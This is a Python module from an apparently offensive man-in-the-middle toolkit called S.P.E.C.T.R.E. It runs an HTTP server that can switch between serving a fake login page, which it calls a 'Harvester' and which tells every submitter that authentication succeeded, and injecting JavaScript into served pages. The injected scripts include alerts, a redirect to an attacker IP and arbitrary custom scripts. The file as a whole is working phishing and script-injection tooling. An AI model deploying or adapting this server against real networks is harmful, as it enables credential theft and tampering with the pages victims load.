# S.P.E.C.T.R.E. Engine - Licensed under AGPL-3.0
# Copyright (c) 2026 M. Sami Furqan. All rights reserved.
# See LICENSE file for full terms.

"""
core/web_server.py — Dynamic HTTP Server for MITM Demonstration
"""

import os
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DEMO_DIR = os.path.join(BASE_DIR, "mitm_demo_site")


class HarvesterHTTPRequestHandler(BaseHTTPRequestHandler):
    harvester_active = False
    injector_active = False
    session_test_active = False
    # Payload state
    payload_type = "Black/Green Screen (Default)"
    custom_script = ""
    attacker_ip = "192.168.1.108"

    # UI Logging callback (Will be wired by MainWindow)
    log_callback = None

    def _get_js_payload(self) -> bytes:
        if self.payload_type == "Black/Green Screen (Default)":
            return b"<script>document.body.bgColor='#000';document.body.style.color='#0f0';alert('S.P.E.C.T.R.E.');</script>"
        elif self.payload_type == "Simple Alert Box":
            return b"<script>alert('S.P.E.C.T.R.E. MITM');</script>"
        elif self.payload_type == "Page Redirect (to attacker IP)":
            return f"<script>window.location.href='http://{self.attacker_ip}';</script>".encode(
                "utf-8"
            )
        elif self.payload_type == "Custom Payload":
            return self.custom_script.encode("utf-8", errors="ignore")
        return b""

    def do_GET(self):
        client_ip = self.client_address[0]

        if self.harvester_active:
            file_path = os.path.join(DEMO_DIR, "login.html")
        elif self.session_test_active:  # <--- ADD THIS BLOCK
            file_path = os.path.join(DEMO_DIR, "session_test.html")
            try:
                with open(file_path, "rb") as f:
                    content = f.read()
                self.send_response(200)
                self.send_header("Content-type", "text/html; charset=utf-8")
                self.send_header("Content-Length", str(len(content)))
                self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
                self.end_headers()
                self.wfile.write(content)
                return
            except FileNotFoundError:
                self.send_error(404)
        elif self.injector_active:
            file_path = os.path.join(DEMO_DIR, "index.html")
            try:
                with open(file_path, "rb") as f:
                    content = f.read()

                js_payload = self._get_js_payload()
                if js_payload:
                    if b"</body>" in content:
                        content = content.replace(
                            b"</body>", js_payload + b"</body>", 1
                        )
                    else:
                        content += js_payload

                    # ── NEW: Log directly to the Passive Event Log ──
                    if self.log_callback:
                        self.log_callback(
                            f"💉 Served injected page [{self.payload_type}] to {client_ip}",
                            "DATA",
                        )

                self.send_response(200)
                self.send_header("Content-type", "text/html; charset=utf-8")
                self.send_header("Content-Length", str(len(content)))
                self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
                self.end_headers()
                try:
                    self.wfile.write(content)
                except BrokenPipeError:
                    pass
                return
            except FileNotFoundError:
                self.send_error(404)
        else:
            file_path = os.path.join(DEMO_DIR, "index.html")

        try:
            with open(file_path, "rb") as f:
                content = f.read()
            self.send_response(200)
            self.send_header("Content-type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(content)))
            self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
            self.end_headers()
            self.wfile.write(content)
        except FileNotFoundError:
            self.send_error(404)

    def do_POST(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        try:
            self.wfile.write(
                b"<html><body><h1>Authentication Successful.</h1><p>Please wait...</p></body></html>"
            )
        except BrokenPipeError:
            pass

    def log_message(self, format, *args):
        pass


class DynamicWebServer(threading.Thread):
    def __init__(self, port=80):
        super().__init__()
        self.port = port
        self.server = None
        self.daemon = True

    def run(self):
        try:
            self.server = HTTPServer(
                ("0.0.0.0", self.port), HarvesterHTTPRequestHandler
            )
            print(f"[WebServer] ✅ Dynamic HTTP Server started on port {self.port}")
            self.server.serve_forever()
        except OSError as e:
            print(
                f"[WebServer] ❌ CRITICAL: Could not start server on port {self.port}. Error: {e}"
            )

    def set_log_callback(self, callback):
        HarvesterHTTPRequestHandler.log_callback = callback

    def set_harvester_active(self, active: bool):
        HarvesterHTTPRequestHandler.harvester_active = active
        print(
            f"[WebServer] 🔄 Harvester state changed. Now serving: {'FAKE LOGIN PAGE' if active else 'NORMAL INDEX PAGE'}"
        )

    def set_injector_active(self, active: bool):
        HarvesterHTTPRequestHandler.injector_active = active
        print(
            f"[WebServer] 🔄 Injector state changed. Now serving: {'INJECTED PAGE' if active else 'NORMAL INDEX PAGE'}"
        )

    def set_injector_payload(
        self, payload_type: str, custom_script: str, attacker_ip: str
    ):
        HarvesterHTTPRequestHandler.payload_type = payload_type
        HarvesterHTTPRequestHandler.custom_script = custom_script
        HarvesterHTTPRequestHandler.attacker_ip = attacker_ip
        HarvesterHTTPRequestHandler.injector_active = True
        print(f"[WebServer] 🔄 Injector payload updated: {payload_type}")

    def set_session_test_active(self, active: bool):
        HarvesterHTTPRequestHandler.session_test_active = active
        print(
            f"[WebServer] 🔄 Session Test state changed. Now serving: {'SESSION TEST PAGE' if active else 'NORMAL INDEX PAGE'}"
        )

    def stop(self):
        if self.server:
            self.server.shutdown()
